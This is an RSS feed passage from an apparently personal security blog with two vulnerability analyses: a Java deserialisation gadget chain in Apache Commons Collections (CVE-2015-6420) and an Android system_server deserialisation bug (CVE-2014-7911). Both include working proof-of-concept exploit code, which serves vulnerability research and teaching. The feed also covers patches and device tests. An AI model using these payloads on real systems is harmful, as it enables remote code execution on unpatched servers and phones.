      <guid>https://zeqiii.github.io/2016/03/05/analysis-of-cve-2015-6420/</guid>
      <description>

&lt;h2 id=&#34;apache-commons-collections:ef74d8aa59408b4c04e16ce890e41e31&#34;&gt;Apache Commons Collections&lt;/h2&gt;

&lt;p&gt;Apache Commons Collections implements &lt;code&gt;TransformedMap&lt;/code&gt; whose &lt;code&gt;decorate()&lt;/code&gt; method can perform some operations on a &lt;code&gt;Map&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    return new TransformedMap(map, keyTransformer, valueTransformer);
}

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;Transformer&lt;/code&gt; is an implementation to transform an object.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public interface Transformer {
    public Object transform(Object input);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;Map&lt;/code&gt; has key and value. Parameters of &lt;code&gt;decorate()&lt;/code&gt;, keyTransformer is responsible for the transformation of the keys of a &lt;code&gt;Map&lt;/code&gt;, valueTransformer is responsible for values of a &lt;code&gt;Map&lt;/code&gt;. When a &lt;code&gt;TransformMap&lt;/code&gt; is modified, the method &lt;code&gt;transform()&lt;/code&gt; of keyTransformer or valueTransformer will be invoked.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/cve-2015-6420/transform.png&#34; alt=&#34;TransformMap&#34; /&gt;&lt;/p&gt;

&lt;h2 id=&#34;invokertransformer:ef74d8aa59408b4c04e16ce890e41e31&#34;&gt;InvokerTransformer&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;InvokerTransformer&lt;/code&gt; is one of the implementation of &lt;code&gt;Transformer&lt;/code&gt;, which can call any method through reflection.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public class InvokerTransformer implements Transformer, Serializable {
...
    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        super();
        iMethodName = methodName;
        iParamTypes = paramTypes;
        iArgs = args;
    }

    public Object transform(Object input) {
        if (input == null) {
            return null;
        }
        try {
            Class cls = input.getClass();
            Method method = cls.getMethod(iMethodName, iParamTypes);
            return method.invoke(input, iArgs);
        } catch (NoSuchMethodException ex) {
            ...
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Given a method name, parameter types and values, &lt;code&gt;InvokerTransformer&lt;/code&gt; uses reflection in its &lt;code&gt;transform()&lt;/code&gt; method to invoke the corresponding method. So attacker can craft a &lt;code&gt;ChainedTransformer&lt;/code&gt; with several &lt;code&gt;InvokerTransformer&lt;/code&gt; in order to execute a series of commands.&lt;/p&gt;

&lt;p&gt;For example&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public static void main(String[] args) throws Exception {
    Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer(&amp;quot;getMethod&amp;quot;, new Class[] {
            String.class, Class[].class }, new Object[] {
            &amp;quot;getRuntime&amp;quot;, new Class[0] }),
        new InvokerTransformer(&amp;quot;invoke&amp;quot;, new Class[] {
            Object.class, Object[].class }, new Object[] {
            null, new Object[0] }),
        new InvokerTransformer(&amp;quot;exec&amp;quot;, new Class[] {
            String.class }, new Object[] {&amp;quot;calc.exe&amp;quot;})};

    Transformer transformedChain = new ChainedTransformer(transformers);

    Map innerMap = new hashMap();
    innerMap.put(&amp;quot;value&amp;quot;, &amp;quot;value&amp;quot;);
    map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
    Map.Entry onlyElement = (Entry) outerMap.entrySet().iterator().next();
    // trigger the invocation of transform()
    onlyElement.setValue(&amp;quot;foobar&amp;quot;);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;When &lt;code&gt;setValue()&lt;/code&gt; is executed, it triggers the callback to invoke &lt;code&gt;transform()&lt;/code&gt;. For &lt;code&gt;ChainedTransformer&lt;/code&gt;, it triggers a series of &lt;code&gt;transform()&lt;/code&gt; to be executed. In the example above, it is equivalent to:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;((Runtime)Runtime.class.getMethod(&amp;quot;getRuntime&amp;quot;,null).invoke(null,new Object[0])).exec(&amp;quot;calc.exe&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;annotationinvocationhandler:ef74d8aa59408b4c04e16ce890e41e31&#34;&gt;AnnotationInvocationHandler&lt;/h2&gt;

&lt;p&gt;To now, we have known that we can craft a &lt;code&gt;TransformedMap&lt;/code&gt; to execute arbitrary code. To archieve our goal, we must find some way to modify the element of  &lt;code&gt;TransformedMap&lt;/code&gt; so that &lt;code&gt;transform()&lt;/code&gt; can be invoked.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;AnnotationInvocationHandler&lt;/code&gt; has a field whose type is &lt;code&gt;Map&lt;/code&gt;. Also, it implements &lt;code&gt;Serializable&lt;/code&gt; and override &lt;code&gt;readObject()&lt;/code&gt;, in which every element of &lt;code&gt;memberValues&lt;/code&gt; invokes &lt;code&gt;setValue()&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;class AnnotationInvocationHandler implements InvocationHandler, Serializable {
    private final Class&amp;lt;? extends Annotation&amp;gt; type;
    private final Map&amp;lt;String, Object&amp;gt; memberValues;

    AnnotationInvocationHandler(Class&amp;lt;? extends Annotation&amp;gt; type, Map&amp;lt;String, Object&amp;gt; memberValues) {
        this.type = type;
        this.memberValues = memberValues;
    }
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, we can initialize an &lt;code&gt;AnnotationInvocationHandler&lt;/code&gt;, set its &lt;code&gt;memberValues&lt;/code&gt; to  our crafted &lt;code&gt;TransformedMap&lt;/code&gt;, then serialize it to get a payload. If the target receives the payload and deserializes it, our code could be executed.&lt;/p&gt;

&lt;h2 id=&#34;poc:ef74d8aa59408b4c04e16ce890e41e31&#34;&gt;POC&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public static void main(String[] args) throws Exception {
    Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer(&amp;quot;getMethod&amp;quot;, new Class[] {
            String.class, Class[].class }, new Object[] {
            &amp;quot;getRuntime&amp;quot;, new Class[0] }),
        new InvokerTransformer(&amp;quot;invoke&amp;quot;, new Class[] {
            Object.class, Object[].class }, new Object[] {
            null, new Object[0] }),
        new InvokerTransformer(&amp;quot;exec&amp;quot;, new Class[] {
            String.class }, new Object[] {&amp;quot;calc.exe&amp;quot;})};

    Transformer transformedChain = new ChainedTransformer(transformers);

    Map innerMap = new hashMap();
    innerMap.put(&amp;quot;value&amp;quot;, &amp;quot;value&amp;quot;);
    map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

    Class cl = Class.forName(&amp;quot;sun.reflect.annotation.AnnotationInvocationHandler&amp;quot;);
    Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
    ctor.setAccessible(true);
    Object instance = ctor.newInstance(Target.class, outerMap);

    File f = new File(&amp;quot;payload.bin&amp;quot;);
    ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
    out.writeObject(instance);
    out.flush();
    out.close();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;references:ef74d8aa59408b4c04e16ce890e41e31&#34;&gt;References&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/&#34;&gt;http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Analysis of cve-2014-7911</title>
      <link>https://zeqiii.github.io/2016/02/29/analysis-of-cve-2014-7911/</link>
      <pubDate>Mon, 29 Feb 2016 16:34:11 +0800</pubDate>
      <author>zeqiii@163.com (zeqi)</author>
      <guid>https://zeqiii.github.io/2016/02/29/analysis-of-cve-2014-7911/</guid>
      <description>

&lt;h2 id=&#34;a-brief-look:acd576735d79af9c00f02f7cf3030262&#34;&gt;A brief look&lt;/h2&gt;

&lt;p&gt;System_server is a process has &lt;strong&gt;system&lt;/strong&gt; permission, to which one can send any serializable data. Although system_server won&amp;rsquo;t invoke any functions of the received objected, but &lt;code&gt;finalize&lt;/code&gt; will be called when &lt;strong&gt;GC&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Function &lt;code&gt;finalize&lt;/code&gt; in &lt;code&gt;android.os.BinderProxy&lt;/code&gt; calls a native function which has pointers, the pointers may be controlled by attackers. So &lt;strong&gt;GC&lt;/strong&gt; may result in arbitrary code execution. &lt;code&gt;android.os.BinderProxy&lt;/code&gt; isn&amp;rsquo;t serializable, however, java.io.ObjectInputStream doesn&amp;rsquo;t check whether an object really is serializable, attackers can craft a fake BinderProxy to acheive the goals.
As other one&amp;rsquo;s blog says:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;ObjectInputStream doesn&amp;rsquo;t validate that the serialized object&amp;rsquo;s class type, as described in the serialized object, is actually serializable. It creates an instance of the wanted class anyway with the deserialized values of the object. Therefore, one can create object of any class, and control its private variables, by serializing objects from another class, that would be deserialized as data members of the wanted class.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&#34;poc:acd576735d79af9c00f02f7cf3030262&#34;&gt;POC&lt;/h2&gt;

&lt;p&gt;Let&amp;rsquo;s just see the POC written by &lt;strong&gt;Jann Horn&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;AAdroid.os.BinderProxy.java&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public class BinderProxy implements Serializable {
   private static final long serialVersionUID = 0;
   //public long mObject = 0x1337beef;
   //public long mOrgue = 0x1337beef;
   private int mObject = 0x1337beef;
   private int mOrgue = 0x1337beef;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;Partial code of MainActivity.java&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;// Put the fake BinderProxy object into a Bundle
Bundle b = new Bundle();
AAdroid.os.BinderProxy evilProxy = new AAdroid.os.BinderProxy();
b.putSerializable(&amp;quot;eatthis&amp;quot;, evilProxy);

// Get IUserManager using reflection
Class clIUserManager = Class.forName(&amp;quot;android.os.IUserManager&amp;quot;);
// Get inner class Stub from IUserManager
Class[] umSubclasses = clIUserManager.getDeclaredClasses();
Class clStub = null;
for (Class c: umSubclasses) {
    if (c.getCanonicalName().equals(&amp;quot;android.os.IUserManager.Stub&amp;quot;)) {
        clStub = c;
    }
}
// Get the field &amp;quot;TRANSACTION_setApplicationRestrictions&amp;quot;
Field fTRANSACTION_setApplicationRestrictions = clStub.getDeclaredField(&amp;quot;TRANSACTION_setApplicationRestrictions&amp;quot;);
fTRANSACTION_setApplicationRestrictions.setAccessible(true);
TRANSACTION_setApplicationRestrictions = fTRANSACTION_setApplicationRestrictions.getInt(null);

// Get UserManager
UserManager um = (UserManager) ctx.getSystemService(Context.USER_SERVICE);
// mService is a field of UserManager, its type is IUserManager
Field fService = UserManager.class.getDeclaredField(&amp;quot;mService&amp;quot;);
fService.setAccessible(true);
// Get mService from UserManager
Object proxy = fService.get(um);

// Get Stub.Proxy from clStub
Class[] stSubclasses = clStub.getDeclaredClasses();
clProxy = null;
for (Class c: stSubclasses) {
    if (c.getCanonicalName().equals(&amp;quot;android.os.IUserManager.Stub.Proxy&amp;quot;)) {
        clProxy = c;
    }
}
// Get field mRemote from Proxy
Field fRemote = clProxy.getDeclaredField(&amp;quot;mRemote&amp;quot;);
fRemote.setAccessible(true);
mRemote = (IBinder) fRemote.get(proxy);
UserHandle me = android.os.Process.myUserHandle();

// Triggr it!
setApplicationRestrictions(ctx.getPackageName(), b, me.hashCode());
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;Implementation of setApplicationRestrictions&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;// This function modifies the Bundle, marshalling it, find &amp;quot;AAdr&amp;quot; and changing it to &amp;quot;andr&amp;quot;, so the class description becomes &amp;quot;android.os.BinderProxy&amp;quot;
public void setApplicationRestrictions(java.lang.String packageName, android.os.Bundle restrictions, int userHandle) throws android.os.RemoteException 
{ 
    android.os.Parcel _data = android.os.Parcel.obtain(); 
    android.os.Parcel _reply = android.os.Parcel.obtain(); 
    try { 
        _data.writeInterfaceToken(DESCRIPTOR); 
        _data.writeString(packageName); 
        _data.writeInt(1); 
        restrictions.writeToParcel(_data, 0); 
        _data.writeInt(userHandle); 
        byte[] data = _data.marshall(); 
        for (int i=0; true; i++) { 
            if (data[i] == &#39;A&#39; &amp;amp;&amp;amp; data[i+1] == &#39;A&#39; &amp;amp;&amp;amp; data[i+2] == &#39;d&#39; &amp;amp;&amp;amp; data[i+3] == &#39;r&#39;) { 
                data[i] = &#39;a&#39;; 
                data[i+1] = &#39;n&#39;; 
                break; 
            } 
        } 
        _data.recycle(); 
        _data = Parcel.obtain(); 
        _data.unmarshall(data, 0, data.length); 
        mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, 0); 
        _reply.readException(); 
    } 
    finally { 
        _reply.recycle(); 
        _data.recycle(); 
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;From the POC we know that a fake object is created and put into a bundle. It&amp;rsquo;s &lt;code&gt;mObject&lt;/code&gt; and &lt;code&gt;mOrgue&lt;/code&gt; is under attacker&amp;rsquo;s controll and can be set to any values. In function &lt;code&gt;setApplicationRestrictions()&lt;/code&gt;, the bundle object is written to a parcel using &lt;code&gt;restrictions.writeToParcel()&lt;/code&gt;. After the parcel marshalled to a byte array, a loop appears to find string &lt;code&gt;AAdr&lt;/code&gt;, and change &lt;code&gt;AA&lt;/code&gt; to &lt;code&gt;an&lt;/code&gt;. Thus, &lt;code&gt;AAdroid.os.BinderProxy&lt;/code&gt; finally becomes &lt;code&gt;android.os.BinderProxy&lt;/code&gt;. When &lt;code&gt;java.io.ObjectInputStream&lt;/code&gt; deserializes this object, a &lt;code&gt;android.os.BinderProxy&lt;/code&gt; object will be created. In this way, attackers can create any object and set the field value as they want.&lt;/p&gt;

&lt;h2 id=&#34;why-binderproxy:acd576735d79af9c00f02f7cf3030262&#34;&gt;Why BinderProxy?&lt;/h2&gt;

&lt;p&gt;So why attackers choose &lt;code&gt;android.os.BinderProxy&lt;/code&gt;? Here is the source code of it.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;protected void finalize() throws Throwable {
	destroy();
	super.finalize();
	return;
	Exception exception;
	exception;
	super.finalize();
	throw exception;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The &lt;code&gt;finalize()&lt;/code&gt; method will call a native method &lt;code&gt;distroy()&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;static void android_os_BinderProxy_destroy(JNIEnv* env, jobject obj) {
    IBinder* b = (IBinder*)
            env-&amp;gt;GetIntField(obj, gBinderProxyOffsets.mObject);
    DeathRecipientList* drl = (DeathRecipientList*)
            env-&amp;gt;GetIntField(obj, gBinderProxyOffsets.mOrgue);
    LOGDEATH(&amp;quot;Destroying BinderProxy %p: binder=%p drl=%p\n&amp;quot;, obj, b, drl);
    env-&amp;gt;SetIntField(obj, gBinderProxyOffsets.mObject, 0);
    env-&amp;gt;SetIntField(obj, gBinderProxyOffsets.mOrgue, 0);
    drl-&amp;gt;decStrong((void*)javaObjectForIBinder);
    b-&amp;gt;decStrong((void*)javaObjectForIBinder);
    IPCThreadState::self()-&amp;gt;flushCommands();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In the above method, &lt;code&gt;mOrgue&lt;/code&gt; is regarded as a pointer of &lt;code&gt;DeathRecipientList&lt;/code&gt;, assigned to &lt;code&gt;drl&lt;/code&gt;. Then &lt;code&gt;drl-&amp;gt;decStrong()&lt;/code&gt; is invoked.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;void RefBase::decStrong(const void* id) const {
    weakref_impl* const refs = mRefs;
    refs-&amp;gt;removeStrongRef(id);
    const int32_t c = android_atomic_dec(&amp;amp;refs-&amp;gt;mStrong);
#if PRINT_REFS
    ALOGD(&amp;quot;decStrong of %p from %p: cnt=%d\n&amp;quot;, this, id, c);
#endif
    ALOG_ASSERT(c &amp;gt;= 1, &amp;quot;decStrong() called on %p too many times&amp;quot;, refs);
    if (c == 1) {
        refs-&amp;gt;mBase-&amp;gt;onLastStrongRef(id);
        if ((refs-&amp;gt;mFlags&amp;amp;OBJECT_LIFETIME_MASK) == OBJECT_LIFETIME_STRONG) {
            delete this;
        }
    }
    refs-&amp;gt;decWeak(id);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;According to other&amp;rsquo;s blog, &lt;code&gt;refs-&amp;gt;mBase-&amp;gt;onLastStrongRef(id);&lt;/code&gt; will eventually causes arbitrary code execution. Below is the assembly code sceenshot from &lt;a href=&#34;http://wooyun.org/&#34;&gt;wooyun.org&lt;/a&gt;, attacker controlls r0 (&lt;code&gt;this&lt;/code&gt; pointer).&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/cve-2014-7911/assembly.png&#34; alt=&#34;Image of assembly&#34; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;weakref_impl* const refs = mRefs;
refs-&amp;gt;removeStrongRef(id);
const int32_t c = android_atomic_dec(&amp;amp;refs-&amp;gt;mStrong);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Transferred to assembly is:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-assembly&#34;&gt;ldr     r4, [r0, #4]   ; attacker controls r0 also r4
mov     r6, r1
mov     r0, r4
blx     &amp;lt;android_atomic_dec ()&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;if (c == 1) {
	refs-&amp;gt;mBase-&amp;gt;onLastStrongRef(id);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Transferred to assembly is:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-assembly&#34;&gt;cmp     r0, #1
bne.n   d1ea
ldr     r0, [r4, #8]  ; attacker controls r4 also r0
mov     r1, r6
ldr     r3, [r0, #0]  ; attacker controls r0 also r3
ldr     r2, [r3, #12] ; attacker controls r3 also r2
blx     r2            ; execute code pointed by r2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If everything goes smoothly, the code pointed by r2 will be executed.&lt;/p&gt;

&lt;h2 id=&#34;key-point-one-how-aadroid-os-binderproxy-becomes-android-os-binderproxy:acd576735d79af9c00f02f7cf3030262&#34;&gt;Key Point One: How AAdroid.os.BinderProxy Becomes android.os.BinderProxy&lt;/h2&gt;

&lt;p&gt;Firstly, a fake BinderProxy object is put into a Bundle. Look into android source code, we can find:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Function &lt;code&gt;putSerializable()&lt;/code&gt; puts the fake object into &lt;code&gt;Bundle.mMap&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Then the Bundle object is written to a parcel.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;writeToParcel()&lt;/code&gt; calls &lt;code&gt;writeArrayMapInternal()&lt;/code&gt;, write the data in &lt;code&gt;mMap&lt;/code&gt; to parcel.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;writeArrayMapInternal()&lt;/code&gt; calls &lt;code&gt;writeValue(Object v)&lt;/code&gt;, to write the value of &lt;code&gt;mMap&lt;/code&gt; into parcel. If the value is an instance of &lt;code&gt;Serializable&lt;/code&gt;, it calls &lt;code&gt;writeSerializable(Serializable serial)&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;In android 4.4.2, &lt;code&gt;writeSerializable()&lt;/code&gt; is implemented as below. It uses &lt;code&gt;ObjectOutputStream&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public final void writeSerializable(Serializable s) {
    if (s == null) {
        writeString(null);
        return;
    }
    String name = s.getClass().getName();
    writeString(name);
    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    try {
        // Output flat
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(s);
        oos.close();
        writeByteArray(baos.toByteArray());
    } catch (IOException ioe) {
        throw new RuntimeException(&amp;quot;Parcelable encountered &amp;quot; +
            &amp;quot;IOException writing serializable object (name = &amp;quot; + name +
            &amp;quot;)&amp;quot;, ioe);
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;**Then the POC uses &lt;code&gt;Parcel.marshall()&lt;/code&gt; to get a byte array and modify its content, changing &lt;code&gt;AA&lt;/code&gt; to &lt;code&gt;an&lt;/code&gt;. **&lt;/p&gt;

&lt;p&gt;Then &lt;code&gt;unmarshall()&lt;/code&gt; this array to get a new parcel object and send to system_server.&lt;/p&gt;

&lt;h2 id=&#34;key-point-two-how-it-is-triggered:acd576735d79af9c00f02f7cf3030262&#34;&gt;Key Point Two: How it is triggered&lt;/h2&gt;

&lt;p&gt;Once system_server receive a parcel object from &lt;code&gt;Stub&lt;/code&gt;, function &lt;code&gt;onTransact()&lt;/code&gt; takes the responsibility for reading data from parcel. The bundle will be restore by &lt;code&gt;Parcel.readBundle()&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public final Bundle readBundle(ClassLoader loader) {
    int length = readInt();
    if (length &amp;lt; 0) {
        ... /* omitted */
    }    
    final Bundle bundle = new Bundle(this, length);
    if (loader != null) {
        bundle.setClassLoader(loader);
    }
    return bundle;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Constructor &lt;code&gt;Bundle(Parcel, int)&lt;/code&gt; init &lt;code&gt;Bundle.mParcelledData&lt;/code&gt;, which can be parsed into &lt;code&gt;Bundle.mMap&lt;/code&gt; by &lt;code&gt;unparcel()&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Fake object is get out by fucntion &lt;code&gt;Bundle.getSerializable()&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public Serializable getSerializable(String key) {
    unparcel();
    Object o = mMap.get(key);
    if (o == null) {
        return null;
    }
    try {
        return (Serializable) o;
    } catch (ClassCastException e) {
        typeWarning(key, o, &amp;quot;Serializable&amp;quot;, e);
        return null;
    }
}

synchronized void unparcel() {
        
    /* omitted */

    mParcelledData.readArrayMapInternal(mMap, N, mClassLoader);
    mParcelledData.recycle();
    mParcelledData = null;
}

// when readArrayMapInternal encounters a serializable type, it invokes readSerializable()
public final Serializable readSerializable() {
    String name = readString();
    if (name == null) {
        /* omitted */
    }

    byte[] serializedData = createByteArray();
    ByteArrayInputStream bais = new ByteArrayInputStream(serializedData);
    try {
        ObjectInputStream ois = new ObjectInputStream(bais);
        /* Problems exist here, an mal-formed BinderProxy obj will be created. */
        /* When GC, the vulnerability is triggered */
        return (Serializable) ois.readObject();
    } catch (IOException ioe) {
        /* omitted */
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;google-s-patch:acd576735d79af9c00f02f7cf3030262&#34;&gt;Google&amp;rsquo;s Patch&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;+    public Class&amp;lt;?&amp;gt; checkAndGetTcObjectClass() throws InvalidClassException {
+        // We check some error possibilities that might cause problems later.
+        boolean wasSerializable = (flags &amp;amp; ObjectStreamConstants.SC_SERIALIZABLE) != 0;
+        boolean wasExternalizable = (flags &amp;amp; ObjectStreamConstants.SC_EXTERNALIZABLE) != 0;
+        if (wasSerializable == wasExternalizable) {
+            throw new InvalidClassException(
+                    getName() + &amp;quot; stream data is corrupt: SC_SERIALIZABLE=&amp;quot; + wasSerializable
+                            + &amp;quot; SC_EXTERNALIZABLE=&amp;quot; + wasExternalizable
+                            + &amp;quot;, classDescFlags must have one or the other&amp;quot;);
+        }
+
+        // TC_ENUM is handled elsewhere. See checkAndGetTcEnumClass().
+        if (isEnum()) {
+            throw new InvalidClassException(
+                    getName() + &amp;quot; local class is incompatible: Local class is an enum, streamed&amp;quot;
+                            + &amp;quot; data is tagged with TC_OBJECT&amp;quot;);
+        }
+
+        // isSerializable() is true if the local class implements Serializable. Externalizable
+        // classes are also Serializable via inheritance.
+        if (!isSerializable()) {
+            throw new InvalidClassException(getName() + &amp;quot; local class is incompatible: Not&amp;quot;
+                    + &amp;quot; Serializable&amp;quot;);
+        }
+
+        // The stream class was externalizable, but is only serializable locally.
+        if (wasExternalizable != isExternalizable()) {
+            throw new InvalidClassException(
+                    getName() + &amp;quot; local class is incompatible: Local class is Serializable, stream&amp;quot;
+                            + &amp;quot; data requires Externalizable&amp;quot;);
+        }
+
+        // The following are left unchecked and thus are treated leniently at this point.
+        // SC_BLOCK_DATA may be set iff SC_EXTERNALIZABLE is set AND version 2 of the protocol is in
+        // use.
+        // SC_ENUM should not be set.
+
+        return forClass();
+    }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;More information in detail, see &lt;a href=&#34;https://android.googlesource.com/platform/libcore/+/738c833d38d41f8f76eb7e77ab39add82b1ae1e2&#34;&gt;android.googlesource.com&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&#34;my-experiment:acd576735d79af9c00f02f7cf3030262&#34;&gt;My Experiment&lt;/h2&gt;

&lt;h3 id=&#34;one-demo-on-hongmi-android-4-2:acd576735d79af9c00f02f7cf3030262&#34;&gt;One: Demo on HongMi (android 4.2)&lt;/h3&gt;

&lt;p&gt;I write two apks, a client and a server.&lt;/p&gt;

&lt;p&gt;Client represents the attacker, server represents a system_server. The things client does are the same as POC. Partial of the server&amp;rsquo;s code is:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public class ServiceImpl extends MyService.Stub {
    @Override
    public void setApplicationRestrictions(String packageName, Bundle restrictions, int userHandler) throws RemoteException {
        Log.e(&amp;quot;remote&amp;quot;, packageName);
        Object obj = restrictions.get(&amp;quot;eathis&amp;quot;);
        Log.e(&amp;quot;remote&amp;quot;, obj.getClass().getName());
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Running client doesn&amp;rsquo;t cause a crash of the phone, but the exceptions below:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;03-02 11:21:20.802 4855-4866/cn.ac.iie.cve20147911_server E/remote: test
03-02 11:21:20.815 4855-4866/cn.ac.iie.cve20147911_server E/JavaBinder: *** Uncaught remote exception!  (Exceptions are not yet supported across processes.)
    java.lang.RuntimeException: Parcelable encountered IOException reading a Serializable object (name = AAdroid.os.BinderProxy)
    at android.os.Parcel.readSerializable(Parcel.java:2144)
    at android.os.Parcel.readValue(Parcel.java:2016)
    at android.os.Parcel.readMapInternal(Parcel.java:2226)
    at android.os.Bundle.unparcel(Bundle.java:223)
    at android.os.Bundle.get(Bundle.java:282)
    at cn.ac.iie.cve20147911_server.ServiceImpl.setApplicationRestrictions(ServiceImpl.java:17)
    at cn.ac.iie.cve20147911_server.MyService$Stub.onTransact(MyService.java:61)
    at android.os.Binder.execTransact(Binder.java:351)
    at dalvik.system.NativeStart.run(Native Method)
    Caused by: java.io.InvalidClassException: android.os.BinderProxy local class is incompatible: Not Serializable
        at java.io.ObjectStreamClass.checkAndGetTcObjectClass(ObjectStreamClass.java:1330)
        at java.io.ObjectInputStream.readNewObject(ObjectInputStream.java:1818)
        at java.io.ObjectInputStream.readNonPrimitiveContent(ObjectInputStream.java:787)
        at java.io.ObjectInputStream.readObject(ObjectInputStream.java:2013)
        at java.io.ObjectInputStream.readObject(ObjectInputStream.java:1970)
        at android.os.Parcel.readSerializable(Parcel.java:2142)
        at android.os.Parcel.readValue(Parcel.java:2016) 
        at android.os.Parcel.readMapInternal(Parcel.java:2226) 
        at android.os.Bundle.unparcel(Bundle.java:223) 
        at android.os.Bundle.get(Bundle.java:282) 
        at cn.ac.iie.cve20147911_server.ServiceImpl.setApplicationRestrictions(ServiceImpl.java:17) 
        at cn.ac.iie.cve20147911_server.MyService$Stub.onTransact(MyService.java:61) 
        at android.os.Binder.execTransact(Binder.java:351) 
        at dalvik.system.NativeStart.run(Native Method) 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;From the call stack, we conclude that the analysis we did before are right, and HongMi&amp;rsquo;s system is patched because there is an exception raised from fucntion &lt;code&gt;ObjectStreamClass.checkAndGetTcObjectClass()&lt;/code&gt; which is added in the patch. Notice that &lt;code&gt;android.os.BinderProxy&lt;/code&gt; appears on the exception.&lt;/p&gt;

&lt;h3 id=&#34;demo-on-huawei-android-4-1:acd576735d79af9c00f02f7cf3030262&#34;&gt;Demo on HuaWei (android 4.1)&lt;/h3&gt;

&lt;p&gt;Do the same thing on an HuaWei phone, the second exception disappeared!&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;03-02 14:37:00.357 31139-31154/cn.ac.iie.cve20147911_server E/remote: test
